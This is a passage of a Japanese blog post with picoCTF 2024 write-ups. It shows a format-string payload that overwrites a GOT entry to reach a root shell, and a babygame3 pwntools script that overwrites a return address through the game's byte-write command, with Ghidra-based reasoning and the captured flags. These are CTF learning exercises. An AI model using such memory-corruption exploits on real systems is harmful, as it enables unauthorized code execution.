Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] Okay I<span class="string">&#x27;ll be nice. Here&#x27;</span>s the address of setvbuf <span class="keyword">in</span> libc: 0x7f94fee023f0</span><br><span class="line">[*] setvbuf() address: 0x7f94fee023f0</span><br><span class="line">[*] system()  address: 0x7f94fedd7760</span><br><span class="line">[*] payload: b<span class="string">&#x27;%96c%47$lln%23c%48$hhn%8c%49$hhn%21c%50$hhn%73c%51$hhn%33c%52$hhnaaaabaa\x18@@\x00\x00\x00\x00\x00\x19@@\x00\x00\x00\x00\x00\x1d@@\x00\x00\x00\x00\x00\x1c@@\x00\x00\x00\x00\x00\x1a@@\x00\x00\x00\x00\x00\x1b@@\x00\x00\x00\x00\x00&#x27;</span></span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">                                                                                               c                      \x8b       \xd0                                                                                            \x00                                \x00aaaabaa\x18id</span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">Makefile</span><br><span class="line">artifacts.tar.gz</span><br><span class="line">flag.txt</span><br><span class="line">format-string-3</span><br><span class="line">format-string-3.c</span><br><span class="line">ld-linux-x86-64.so.2</span><br><span class="line">libc.so.6</span><br><span class="line">metadata.json</span><br><span class="line">profile</span><br><span class="line">$ <span class="built_in">cat</span> flag.txt</span><br><span class="line">picoCTF&#123;G07_G07?_f574d38f&#125;</span><br></pre></td></tr></table></figure>

<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{f0rm47_57r?_f0rm47_m3m_99fd82cd}

</aside>

<h3><span id="babygame3">babygame3</span></h3><img src="/img/2024/03-27/Untitled%2057.png" width="550px" height="auto"> 

<p>めちゃくちゃ苦労した… 試行錯誤で解いた感じで、未だにアドレス計算がなんでこうなったか分かりきってない。</p>
<p>解法がやや複雑なので予め要約すると「いい感じのアドレスにプレイヤーを移動させて、プレイヤー文字を上書きしたい1バイトにセットして move_player を呼ぶことで、move_player の戻り値アドレスを好きな飛ばし先に書き換える」感じ。</p>
<p>なお、main → move_player → solve_round → move_player のコールチェーンで solve_round のアドレスを win のアドレスに書き換える戦略を取った人もいるかと思うが、それやるとwin関数の中で <code>level != 5</code> となってしまってフラグがprintされない（1敗）。</p>
<hr>
<p>move_player() 関数をGhidraで逆コンパイルし、自分なりにわかりやすく変数名を付けたりしたのが↓。</p>
<img src="/img/2024/03-27/Untitled%2058.png" width="550px" height="auto"> 

<p>42行目がミソで、</p>
<ul>
<li>プレイヤーのx, y座標を動かすことで、 <code>map + x + 0x5a * y</code> のアドレスの値を</li>
<li>player_tile の1バイトに置き換えられる</li>
</ul>
<p>player_tileは <code>l</code> コマンドで書き換えられる。</p>
<hr>
<p>次にmain関数を見る。</p>
<img src="/img/2024/03-27/Untitled%2059.png" width="550px" height="auto"> 

<p>28, 35行目の条件分岐が大変厄介。</p>
<p>35行目は「Level 5じゃないとwinさせない」と言っているのに、28行目では「Level 4の場合は次のレベルに進ませない」と言っている。</p>
<p>これらの条件分岐をbypassしたい。</p>
<hr>
<p>以下の戦略とする。</p>
<ol>
<li>ゲームの <code>l</code> コマンドによって任意の1バイトを書き換えられる。</li>
<li>main関数からmove_player関数を呼び出す際に、main関数への戻りアドレスを少し弄り、条件分岐をbypassするようにする。</li>
</ol>
<hr>
<p>より具体的には、</p>
<ol>
<li><code>aaaaaaaawwwwsp</code> を3回繰り返し、普通にLevel4になる</li>
<li>move_player を呼び出す。ただし、その戻り値をただのmain関数 (0x0804992c) から、 <code>puts(”You win!...&quot;);</code> の場所 (0x08049970) に上書きする<ol>
<li>move_playerを <code>l</code>コマンドで呼び出すのはNG。move_player L23 の命令でプレイヤー位置 0x2e に上書きされてしまう</li>
</ol>
</li>
<li>move_player を呼び出す。ただし、その戻り値をただのmain関数から、  <code>win(&amp;level)</code>  の場所 (0x080499fe)に上書きする</li>
</ol>
<hr>
<p>以上の方針で書いたコードが以下。何回移動するかはメモリダンプとにらめっこしながら試行錯誤した（本当は綺麗に求まるはずだけど何故かずれてしまい…）。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## Run local executable.</span></span><br><span class="line"><span class="comment">##   ./exploit.py LOCAL EXE=./executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run remote (with local executable for addresses)</span></span><br><span class="line"><span class="comment">##   ./exploit.py HOST=example.com PORT=4141 EXE=/tmp/executable</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">## Run with GDB script.</span></span><br><span class="line"><span class="comment">##   ./exploit.py GDB</span></span><br><span class="line"><span class="comment">## --- (Edit GDB script if necessary) --------------------------------</span></span><br><span class="line">gdbscript = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">#b *main+182</span></span><br><span class="line"><span class="string">b *move_player+89</span></span><br><span class="line"><span class="string">#b solve_round</span></span><br><span class="line"><span class="string">c 4</span></span><br><span class="line"><span class="string">b *move_player+351</span></span><br><span class="line"><span class="string">c</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span>.<span class="built_in">format</span>(</span><br><span class="line">    **<span class="built_in">locals</span>()</span><br><span class="line">)</span><br><span class="line"><span class="comment">## -------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">## --- (do not edit) ---------------------------------------------------</span></span><br><span class="line">exe = context.binary = ELF(args.EXE)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_local</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process([exe.path] + argv, *a, **kw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_remote</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    host = args.HOST</span><br><span class="line">    port = <span class="built_in">int</span>(args.PORT)</span><br><span class="line">    io = connect(host, port)</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>(<span class="params">argv=[], *a, **kw</span>):</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        <span class="keyword">return</span> start_local(argv, *a, **kw)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> start_remote(argv, *a, **kw)</span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"><span class="comment">## -----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## EXPLOIT GOES HERE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## Level 4まで行く</span></span><br><span class="line">io.sendline(<span class="string">b&quot;aaaaaaaawwwwsp&quot;</span> * <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## ---- Level 4 ----</span></span><br><span class="line"><span class="comment">## lifeを大きくする; (x, y) = (-4, 0)</span></span><br><span class="line">io.sendline(<span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;w&quot;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 次に呼び出す move_player にとっての戻り値アドレスを、</span></span><br><span class="line"><span class="comment">## `puts(”You win!...` のものに書き換える</span></span><br><span class="line"><span class="comment">## （スタック破壊しないように低位アドレスを迂回）</span></span><br><span class="line">io.sendline(<span class="string">b&quot;w&quot;</span>*<span class="number">3</span> + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x2b</span> + <span class="string">b&#x27;s&#x27;</span>*<span class="number">1</span> + <span class="string">b&#x27;l\x70&#x27;</span> + <span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## ---- Level 5 ----</span></span><br><span class="line"><span class="comment">## lifeを大きくする; (x, y) = (-4, 0)</span></span><br><span class="line">io.sendline(<span class="string">b&quot;a&quot;</span> * <span class="number">8</span> + <span class="string">b&quot;w&quot;</span>*<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">## 次に呼び出す move_player にとっての戻り値アドレスを、</span></span><br><span class="line"><span class="comment">## `win(&amp;level)` のものに書き換える</span></span><br><span class="line"><span class="comment">## （スタック破壊しないように低位アドレスを迂回）</span></span><br><span class="line">io.sendline(<span class="string">b&quot;w&quot;</span>*<span class="number">3</span> + <span class="string">b&#x27;d&#x27;</span>*<span class="number">0x1b</span> + <span class="string">b&#x27;s&#x27;</span>*<span class="number">1</span> + <span class="string">b&#x27;l\xfe&#x27;</span> + <span class="string">b&#x27;s&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line">io.close()</span><br></pre></td></tr></table></figure>

<hr>
<p>これを実行してフラグゲット。</p>
<aside style="padding: 10px; border-radius: 5px; border: 1px solid #eee; background-color: transparent; width: 800px;">
⛳ picoCTF{gamer_leveluP_84600233}

</aside>

<h3><span id="解けず-high-frequency-troubles">(解けず😭) high frequency troubles</span></h3><p>問題チラ見しただけでやってない！</p>

    
  </div>
  <footer class="entry-footer">
    <div class="entry-meta-footer">
      <span class="category">
        
      </span>
      <span class="tags">
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3/" rel="tag">セキュリティ</a></li></ul>

      </span>
    </div>
  </footer>
  
  <footer class="author-info clearfix">
    <img class="author-picture circle" src="https://www.gravatar.com/avatar/cb02a2b3f429b7c938d1fe2665e8e342">
    <div class="author-content right">
      <div class="author-caption">
        <span class="label">author</span>
        Sho Nakatani a.k.a. laysakura
      </div>
      <p class="author-description">
        東京大学大学院 情報理工学系研究科 電子情報学専攻 修士課程で並列分散処理・ストリーム処理・データベースを研究。<br>
        2014年4月に株式会社ディー・エヌ・エーにエンジニアスペシャリストとして入社し、ソーシャルゲームのサーバサイド共通基盤の開発に従事。<br>
        2016年8月より、オンライン証券会社<a target="_blank" rel="noopener" href="https://folio-sec.com">株式会社FOLIO</a>に入社。バックエンドシステム開発・プロジェクトマネージメント・Engineering
        Managementに従事。<br>
        2020年3月より<a target="_blank" rel="noopener" href="https://idein.jp">Idein株式会社</a>所属。デバイス・高性能計算関連の研究開発。<br>
        2021年9月よりトヨタ自動車株式会社所属。自動車データの収集〜分析基盤の研究開発に従事。<br>
        その他個人事業主として、RDBMS開発やIntel SGXを利用するためのライブラリ開発などの活動。
      </p>
      <ul class="author-social-buttons">
        <li class="author-social-button"><a class="fa fa-lg fa-twitter-square" target="_blank" rel="noopener" href="https://twitter.com/laysakura"></a>
        </li>
        <li class="author-social-button"><a class="fa fa-lg fa-github-square" target="_blank" rel="noopener" href="https://github.com/laysakura"></a>
        </li>
        <li class="author-social-button"><a class="fa fa-lg fa-facebook-square"
            target="_blank" rel="noopener" href="https://www.facebook.com/lay.sakura"></a></li>
      </ul>
    </div>
  </footer>
  
  
  
<nav id="article-nav">
  
  
    <a href="/2024/02/26/vlc-cybercontest-2024/" id="article-nav-older" class="article-nav-link-wrap">
      <strong class="article-nav-caption">Older</strong>
      <div class="article-nav-title">
        
          防衛省サイバーコンテスト 2024 - Writeup
        
      </div>
    </a>
  
</nav>

  
</article>




<section id="comments">
  <div id="disqus_thread">

    <!-- comment service provided by disqus -->
    <script>
      /**
       *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
       *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
       */
      var disqus_config = function () {
        this.page.url = https://laysakura.github.io/2024/03/27/picoctf-2024/;  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = https://laysakura.github.io/2024/03/27/picoctf-2024/; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
      };
      (function () {  // DON'T EDIT BELOW THIS LINE
        var d = document, s = d.createElement('script');

        s.src = '//laysakura.disqus.com/embed.js';

        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
      })();
    </script>

    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="//disqus.com/?ref_noscript">comments powered by
        Disqus.</a></noscript>
  </div>
</section>


    </div>
    <div class="mb-search">
  <form action="//google.com/search" method="get" accept-charset="utf-8">
    <input type="search" name="q" results="0" placeholder="Search">
    <input type="hidden" name="q" value="site:laysakura.github.io">
  </form>
</div>
<footer id="footer">
	<h1 class="footer-blog-title">
		<a href="/">俺とお前とlaysakura</a>
	</h1>
	<span class="copyright">
		&copy; 2024 Sho Nakatani a.k.a. laysakura<br>
		Modify from <a href="https://sanographix.github.io/tumblr/apollo/" target="_blank">Apollo</a> theme, designed by <a href="https://www.sanographix.net/" target="_blank">SANOGRAPHIX.NET</a><br>
		Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
	</span>
</footer>

    
<script>
  var disqus_shortname = 'laysakura';
  
  var disqus_url = 'https://laysakura.github.io/2024/03/27/picoctf-2024/';
  
  (function(){
    var dsq = document.createElement('script');
    dsq.type = 'text/javascript';
    dsq.async = true;
    dsq.src = '//go.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
</script>


<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>



<script src="/js/script.js"></script>

  </div>

  <!-- https://github.com/vfeskov/vanilla-back-to-top -->
  <script src="https://unpkg.com/vanilla-back-to-top@7.2.1/dist/vanilla-back-to-top.min.js"></script>
  <script>addBackToTop({
    diameter: 50,
    backgroundColor: '#33a6b880',
    textColor: '#fff'
  })</script>

</body>
</html>
